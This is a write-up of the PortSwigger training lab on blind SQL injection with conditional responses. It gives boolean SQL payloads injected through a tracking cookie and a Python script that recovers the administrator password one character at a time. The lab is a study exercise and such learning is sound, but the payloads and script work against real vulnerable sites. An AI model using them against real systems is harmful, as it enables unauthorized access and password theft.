---
layout: post
title: "Blind SQL injection with conditional responses [Write-up]"
date: 2026-07-02
platform: portswigger
vulntype: sqli
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** Blind SQL injection with conditional responses

**Platform:** PortSwigger

**Difficulty:** Medium  

---

# Description 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Solution

First, let's intercept the request using Burp Suite. We have a potential injection point in the cookie—here's what those fields look like:

```python
Cookie: TrackingId=dz1NhXiSlldZSJbp; session=F8oyWdSg5j1BdFvPYeH21oMzFVBE4Ilp
```

Another interesting detail here is the “Welcome Back” message, which appears when the request is successful and disappears when there's an error, allowing us to carry out a blind attack.

Let's first determine the number of characters in the password; to do this, we'll use this payload 

```python
' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = 1--
```

```python
Cookie: TrackingId=dz1NhXiSlldZSJbp' AND LENGTH((SELECT password FROM users WHERE username='administrator')) = 1--;
```

It's best to use a script to speed up the process, but you can also do it manually, checking each one until you encounter an error. 

After a few seconds, you'll notice that the password is 20 characters long 

So let's start going through these characters. There are different ways to do this here, but I don't recommend doing it manually because it will take too long. Also, if you're using the standard Burp Suite, it will still take you some time, so the best approach is to automate the process using a script. 

```python
import requests
import string

REQUEST_URL = "https://YOUR_ID.web-security-academy.net/"   

payloadChar = string.ascii_lowercase + string.digits
pChar = ""

def requestLab(url, payload):
    cookies = {
        "TrackingId": "YOUR_TrackingId" + payload,
        "session": "YOUR_Session"
    }

    r = requests.get(url, cookies=cookies)
    return r.text

for i in range(1, 21):
    for c in payloadChar:
        payload = (
            f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,{i})='{pChar + c}'--"
        )

        response = requestLab(REQUEST_URL, payload)

        if "Welcome back!" in response:
            pChar += c
            print("Found:", pChar)
            break

print("Password found:", pChar)
```

But if you're curious about what the payload itself looks like without the script, here's what it looks like: 

```python
' and (select substring(password, 1, 1) from users where username='administrator')='a;
```

We managed to find out the password and enter it into the login form 
